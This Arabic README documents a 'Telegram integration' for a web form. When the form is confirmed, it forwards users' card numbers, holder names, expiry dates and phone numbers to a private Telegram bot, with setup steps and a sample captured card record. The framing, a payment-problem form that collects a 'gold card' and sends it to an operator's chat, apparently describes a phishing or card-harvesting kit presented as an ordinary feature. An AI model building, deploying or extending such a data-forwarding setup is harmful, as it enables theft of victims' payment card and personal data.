# Telegram Integration - تكامل تيليجرام

تم إضافة إمكانية إرسال جميع بيانات النموذج التي يدخلها المستخدمون تلقائياً إلى بوت تيليجرام عند تأكيد العملية.

## ما تم إضافته

### 1. ملفات جديدة:
- `src/lib/telegram-client.ts` - مكتبة العميل لإرسال البيانات إلى تيليجرام
- `TELEGRAM_SETUP.md` - دليل شامل لإعداد البوت والربط
- `.env.example` - ملف مثال متغيرات البيئة

### 2. التعديلات على الملفات الموجودة:
- `src/routes/index.tsx` - إضافة حلقة useEffect للاستماع إلى تأكيد النموذج وإرسال البيانات

## آلية العمل

عند إكمال المستخدم للنموذج وتأكيد العملية:
1. يتم تجميع جميع البيانات المدخلة:
   - معرّف المشكلة (Problem ID)
   - الرقم المتسلسلي (Serial Number)
   - طريقة الدفع (Payment Method)
   - تفاصيل الدفع (Payment Details - رقم البطاقة/البريدي، الاسم، الهاتف، إلخ)

2. يتم تنسيق الرسالة بصيغة HTML عربية

3. يتم إرسال الرسالة مباشرة إلى Telegram API

4. الرسالة تصل إلى البوت الذي تحدد معرفه في متغيرات البيئة

## متغيرات البيئة المطلوبة

```
VITE_TELEGRAM_BOT_TOKEN=your_bot_token_here
VITE_TELEGRAM_CHAT_ID=your_chat_id_here
```

ملاحظة: يجب أن تكون المتغيرات مع بادئة `VITE_` لأن التطبيق يستخدم Vite

## خطوات الإعداد السريعة

### الخطوة 1: إنشاء بوت
1. افتح Telegram وابحث عن `@BotFather`
2. أرسل `/start` ثم `/newbot`
3. اتبع التعليمات واحصل على **Bot Token**

### الخطوة 2: الحصول على Chat ID
1. استبدل `TOKEN` بالتوكن الخاص بك:
   ```
   https://api.telegram.org/botTOKEN/getUpdates
   ```
2. أرسل أي رسالة للبوت
3. أعد تحميل الرابط وابحث عن `"chat":{"id":` للحصول على Chat ID

### الخطوة 3: تعيين المتغيرات
أنشئ ملف `.env.local` في جذر المشروع:
```env
VITE_TELEGRAM_BOT_TOKEN=your_token
VITE_TELEGRAM_CHAT_ID=your_chat_id
```

### الخطوة 4: الاختبار
1. شغّل التطبيق: `pnpm dev`
2. ملأ النموذج كاملاً
3. عند التأكيد، تحقق من رسائل البوت على Telegram

## مثال على الرسالة المُرسلة

```
📋 تم استقبال طلب جديد

معرّف المشكلة: مشكل في الدفع
الرقم المتسلسلي: 123456789
طريقة الدفع: البطاقة الذهبية

تفاصيل الدفع:
• Card Number: 4532 1234 5678 9010
• Card Holder: Ahmed Mohammed
• Expiry: 12/25
• Phone: 213541234567

تم إرسال البيانات في: 16/7/2026، 8:45:32 م
```

## ملاحظات الأمان

⚠️ **مهم جداً:**

1. **لا تشارك Bot Token**: هذا التوكن هو كلمة السر الخاصة بالبوت
2. **لا ترفع `.env.local`**: أضفه إلى `.gitignore`
3. **البيانات المُرسلة حساسة**: قد تشمل أرقام بطاقات وحسابات بنكية
4. **استخدم Vercel Environment Variables في الإنتاج**: لا تضع المتغيرات في الكود مباشرة

## استكشاف الأخطاء

### عدم استقبال رسائل؟
- تحقق من أن Bot Token و Chat ID صحيحين
- تأكد من أن متغيرات البيئة مع بادئة `VITE_`
- تحقق من سجل المتصفح (Console)

### خطأ "Telegram configuration is missing"
- تأكد من وجود `.env.local` في جذر المشروع
- عيّن المتغيرات الصحيحة

### الرسالة لا تُرسل
- تحقق من اتصال الإنترنت
- تأكد من أن البوت نشط
- ابحث عن رسائل الخطأ في console المتصفح

## معلومات إضافية

للمزيد من التفاصيل، انظر:
- `TELEGRAM_SETUP.md` - دليل الإعداد الكامل
- `src/lib/telegram-client.ts` - الكود الفعلي للتكامل
- Telegram Bot API: https://core.telegram.org/bots/api
